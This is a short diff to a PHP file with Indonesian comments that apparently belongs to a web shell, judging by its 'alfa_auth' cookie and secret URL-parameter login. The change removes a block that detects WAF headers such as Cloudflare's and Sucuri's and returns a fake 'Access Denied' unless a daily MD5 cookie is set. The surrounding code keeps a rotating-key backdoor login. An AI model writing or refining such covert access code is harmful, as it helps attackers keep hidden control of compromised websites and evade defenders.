@@ -32,20 +32,6 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
     }
 }
 
-// Deteksi WAF via header
-$waf_headers = ['X-WAF', 'X-Sucuri-ID', 'X-Cloudflare', 'CF-RAY', 'X-Request-ID'];
-foreach ($waf_headers as $hdr) {
-    $key = 'HTTP_' . strtoupper(str_replace('-', '_', $hdr));
-    if (isset($_SERVER[$key])) {
-        // Ada WAF di depan → auth via cookie
-        if (!isset($_COOKIE['alfa_auth']) || $_COOKIE['alfa_auth'] !== md5($AUTH_KEY . date('Y-m-d'))) {
-            header('HTTP/1.0 403 Forbidden');
-            die('Access Denied');
-        }
-        break;
-    }
-}
-
 // Rotasi key harian + autentikasi (tetap pertahankan GET untuk kompatibilitas)
 $today = date('Ymd');
 if (!isset($_COOKIE['alfa_auth']) && isset($_GET[$PARAM_NAME]) && $_GET[$PARAM_NAME] === $AUTH_KEY) {
